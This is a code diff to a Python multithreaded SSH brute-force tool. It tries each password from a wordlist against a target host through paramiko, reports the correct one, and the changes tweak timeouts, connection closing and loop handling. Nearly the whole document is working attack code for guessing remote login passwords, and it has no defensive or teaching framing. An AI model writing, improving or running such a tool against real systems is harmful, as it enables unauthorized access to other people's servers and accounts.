@@ -34,21 +34,25 @@ class BruteForce:
             line = linecache.getline(self.filename, i)
             line = line.strip()
             try:
-                client = self.get_ssh().connect(self.host, username=self.user, password=line)
+                self.get_ssh().connect(self.host, username=self.user, password=line,timeout=86400,banner_timeout=86400,auth_timeout=86400).close()
                 q.put(line)   
                 print(f'[+] {line} is correct')
                 break
             except:
                 print(f'[-] {line} is not correct')
-                continue
-
+            # finally:
+            #     if self.client:
+            #         self.client.close()
+            #     continue
     def get_ssh(self):
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         return client
 
     def get_filelines(self,filename):
-        return len(linecache.getlines(self.filename))
+        lens = len(linecache.getlines(self.filename))
+        linecache.clearcache()
+        return lens
 
 def get_time(start_time,end_time):
     spend = end_time - start_time
@@ -88,5 +92,7 @@ if __name__ == '__main__':
                 thread_join += 1
                 if thread_join == thread_num:
                     sys.exit(f'[!] Brute force finished\n[!] SSH password not found\nTime: {get_time(start_time,time.time())}')
+            else:
+                continue
         thread_join = 0
         
